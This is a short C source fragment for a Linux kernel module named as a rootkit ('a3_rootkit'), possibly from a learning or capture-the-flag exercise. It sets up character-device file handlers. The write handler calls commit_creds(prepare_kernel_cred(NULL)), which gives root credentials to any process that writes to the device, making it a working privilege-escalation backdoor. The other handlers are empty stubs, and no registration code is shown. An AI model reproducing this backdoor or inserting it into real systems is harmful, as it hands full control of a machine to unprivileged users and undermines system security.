#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include "rootkit.h"

static int a3_rootkit_open(struct inode * __inode, struct file * __file)
{
    return 0;
}

static ssize_t a3_rootkit_read(struct file * __file, char __user * user_buf, size_t size, loff_t * __loff)
{
    return 0;
}

static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_buf, size_t size, loff_t * __loff)
{
	commit_creds(prepare_kernel_cred(NULL));
    return 0;
}

static int a3_rootkit_release(struct inode * __inode, struct file * __file)
{
    printk(KERN_INFO "get info");
    return 0;
}

static long a3_rootkit_ioctl(struct file * __file, unsigned int cmd, unsigned long param)
{
    return 0;
}
